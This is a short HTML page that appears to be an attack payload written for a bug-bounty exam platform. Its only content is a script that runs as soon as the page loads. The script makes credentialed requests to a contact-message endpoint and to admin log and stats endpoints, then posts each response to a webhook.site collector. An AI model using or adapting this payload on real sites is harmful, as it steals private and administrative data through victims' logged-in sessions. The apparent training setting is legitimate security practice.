<!DOCTYPE html>
<html>
<body>
    <script>
        const webh = "https://webhook.site/6b0b4772-6bdc-417e-a83a-2403f5690ef1";
        const base = "https://api-bugbounty-exam.hashacademy.co";
        const msgId = "69ea47fabee6d6b7c6645a43";

        async function leak() {
            const endpoints = [
                `/api/contact/messages/${msgId}`,
                `/api/admin/logs`,
                `/api/admin/stats`
            ];

            for (const path of endpoints) {
                try {
                    const response = await fetch(base + path, { credentials: 'include' });
                    const text = await response.text();
                    await fetch(webh, {
                        method: 'POST',
                        body: JSON.stringify({ endpoint: path, data: text })
                    });
                } catch (e) {}
            }
        }
        leak();
    </script>
